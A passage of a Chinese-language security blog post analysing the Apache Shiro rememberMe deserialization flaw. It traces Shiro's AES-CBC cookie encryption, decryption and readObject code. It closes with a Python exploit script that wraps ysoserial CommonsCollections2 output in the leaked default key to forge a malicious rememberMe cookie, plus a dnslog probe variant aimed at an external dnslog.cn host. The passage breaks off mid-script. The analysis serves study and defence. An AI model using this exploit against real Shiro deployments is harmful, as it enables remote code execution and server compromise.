            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">int</span> sizeInBytes <span class="token operator">=</span> size <span class="token operator">/</span> <span class="token constant">BITS_PER_BYTE</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ivBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>sizeInBytes<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">SecureRandom</span> random <span class="token operator">=</span> <span class="token function">ensureSecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        random<span class="token punctuation">.</span><span class="token function">nextBytes</span><span class="token punctuation">(</span>ivBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ivBytes<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对获得的反序列化数据进行base64加密，然后添加到cookie中</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Cookie</span> template <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//the class attribute is really a template for the outgoing cookies</span>
        <span class="token class-name">Cookie</span> cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleCookie</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cookie<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cookie<span class="token punctuation">.</span><span class="token function">saveTo</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h3><p>之前调用了AbstractRememberMeManager.encrypt进行加密，那么猜测在AbstractRememberMeManager中存在decrypt解密函数</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>
        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进getCipherService方法看一下，和之前的操作相同，再看一下decrypt方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ByteSource</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted <span class="token operator">=</span> ciphertext<span class="token punctuation">;</span>

        <span class="token comment">//No IV, check if we need to read the IV from the stream:</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span>
                <span class="token comment">//is:</span>
                <span class="token comment">// - the first N bytes is the initialization vector, where N equals the value of the</span>
                <span class="token comment">// 'initializationVectorSize' attribute.</span>
                <span class="token comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span>

                <span class="token comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span>
                <span class="token comment">//the IV to decrypt the real ciphertext:</span>

                <span class="token keyword">int</span> ivSize <span class="token operator">=</span> <span class="token function">getInitializationVectorSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">int</span> ivByteSize <span class="token operator">=</span> ivSize <span class="token operator">/</span> <span class="token constant">BITS_PER_BYTE</span><span class="token punctuation">;</span>

                <span class="token comment">//now we know how large the iv is, so extract the iv bytes:</span>
                iv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>ivByteSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ivByteSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span>
                <span class="token keyword">int</span> encryptedSize <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">-</span> ivByteSize<span class="token punctuation">;</span>
                encrypted <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>encryptedSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> ivByteSize<span class="token punctuation">,</span> encrypted<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> encryptedSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"Unable to correctly extract the Initialization Vector or ciphertext."</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">CryptoException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token comment">//进入下一层解密，跟进</span>
        <span class="token keyword">return</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进crypt方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">ByteSource</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Attempting to decrypt incoming byte array of length "</span> <span class="token operator">+</span>
                    <span class="token punctuation">(</span>ciphertext <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decrypted <span class="token operator">=</span> <span class="token function">crypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token constant">DECRYPT_MODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> decrypted <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token class-name">ByteSource<span class="token punctuation">.</span>Util</span><span class="token punctuation">.</span><span class="token function">bytes</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解密完成</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">,</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> key<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"key argument cannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> cipher <span class="token operator">=</span> <span class="token function">initNewCipher</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">crypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一步步返回到AbstractRememberMeManager的decrypt方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>
        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>return，看到deserialize方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            bytes <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进Deserialize，找到了ReadObject方法，可以开始调用。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SerializationException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>serialized <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"argument cannot be null."</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassResolvingObjectInputStream</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token class-name">T</span> deserialized <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> deserialized<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"Unable to deserialze argument byte array."</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SerializationException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x4-exp编写"><a href="#0x4-exp编写" class="headerlink" title="0x4 exp编写"></a>0x4 exp编写</h2><h2 id="本次AES加密的一些小知识点："><a href="#本次AES加密的一些小知识点：" class="headerlink" title="本次AES加密的一些小知识点："></a><strong>本次AES加密的一些小知识点：</strong></h2><ul>
<li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li>
<li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li>
<li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li>
</ul>
<p>加密流程就是：</p>
<ul>
<li>使用的 AES/CBC/PKCS5Padding 模式</li>
<li>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</li>
<li>key为预留的那个硬编码</li>
<li>encrypt(plaintext, key, ivBytes, generate) 生成</li>
<li>最后base64加密，放入cookie中</li>
</ul>
<p>解密流程可以知道：</p>
<ul>
<li>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</li>
<li>base64解密cookie 中 rememberMe的值</li>
<li>根据解密 vi 是 秘文的前16位</li>
<li>iv即为rememberMe解码后的前16个字节</li>
<li>有了key 和 vi 就可以解密到反序列化的数据了</li>
</ul>
<p>那POC的我们的加密流程就是：</p>
<ol>
<li>获取到 反序列化的数据</li>
<li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li>
<li>设置硬编码的 key</li>
<li>使用随机数生成 16 字节的 iv</li>
<li>使用 iv + AES加密(反序列化数据) 拼接</li>
<li>最后base64加密全部内容</li>
</ol>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a><strong>利用思路</strong></h2><p>这里主要导入的是这个版本的apache.commons</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
&lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
&lt;version&gt;4.0&lt;/version&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>所以我们EXP利用CommonsCollections2 的利用链</p>
<p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">base64</span>
<span class="token keyword">import</span> <span class="token namespace">sys</span>
<span class="token keyword">import</span> <span class="token namespace">uuid</span>
<span class="token keyword">import</span> <span class="token namespace">subprocess</span>

<span class="token keyword">import</span> <span class="token namespace">requests</span>
from <span class="token class-name">Crypto<span class="token punctuation">.</span>Cipher</span> <span class="token keyword">import</span> <span class="token constant">AES</span>

def <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token operator">:</span>
    # 这里使用<span class="token class-name">CommonsCollections2</span>模块
    popen <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">subprocess<span class="token punctuation">.</span></span>Popen</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token char">'java'</span><span class="token punctuation">,</span> <span class="token char">'-jar'</span><span class="token punctuation">,</span> 'ysoserial<span class="token punctuation">.</span>jar<span class="token char">', '</span><span class="token class-name">CommonsCollections2</span>'<span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span><span class="token constant">PIPE</span><span class="token punctuation">)</span>
    # 明文需要按一定长度对齐，叫做块大小<span class="token class-name">BlockSize</span> 这个块大小是 block_size <span class="token operator">=</span> <span class="token number">16</span> 字节
    <span class="token constant">BS</span> <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span>block_size
    # 按照加密规则按一定长度对齐<span class="token punctuation">,</span>如果不够要要做填充对齐
    pad <span class="token operator">=</span> lambda s<span class="token operator">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    # 泄露的key
    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
    # <span class="token constant">AES</span>的<span class="token constant">CBC</span>加密模式
    mode <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_CBC</span>
    # 使用uuid4基于随机数模块生成<span class="token number">16</span>字节的 iv向量
    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span><span class="token function">uuid4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bytes
    # 实例化一个加密方式为上述的对象
    encryptor <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    # 用pad函数去处理yso的命令输出，生成的序列化数据
    file_body <span class="token operator">=</span> <span class="token function">pad</span><span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    # iv 与 （序列化的<span class="token constant">AES</span>加密后的数据）拼接， 最终输出生成rememberMe参数
    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64_rememberMe_value

def <span class="token function">dnslog</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token operator">:</span>
    popen <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">subprocess<span class="token punctuation">.</span></span>Popen</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token char">'java'</span><span class="token punctuation">,</span> <span class="token char">'-jar'</span><span class="token punctuation">,</span> 'ysoserial<span class="token punctuation">.</span>jar<span class="token char">', '</span><span class="token constant">URLDNS</span>'<span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span><span class="token constant">PIPE</span><span class="token punctuation">)</span>
    <span class="token constant">BS</span> <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span>block_size
    pad <span class="token operator">=</span> lambda s<span class="token operator">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
    mode <span class="token operator">=</span> <span class="token class-name">AES<span class="token punctuation">.</span>MODE_CBC</span>
    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span><span class="token function">uuid4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bytes
    encryptor <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    file_body <span class="token operator">=</span> <span class="token function">pad</span><span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64_rememberMe_value

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> '__main__'<span class="token operator">:</span>
    # cc2的exp
    payload <span class="token operator">=</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>'<span class="token operator">/</span><span class="token class-name">System</span><span class="token operator">/</span><span class="token class-name">Applications</span><span class="token operator">/</span><span class="token class-name">Calculator</span><span class="token punctuation">.</span>app<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">MacOS</span><span class="token operator">/</span><span class="token class-name">Calculator</span>'<span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    # dnslog的poc
    payload1 <span class="token operator">=</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>rjnck7<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn'<span class="token punctuation">)</span>
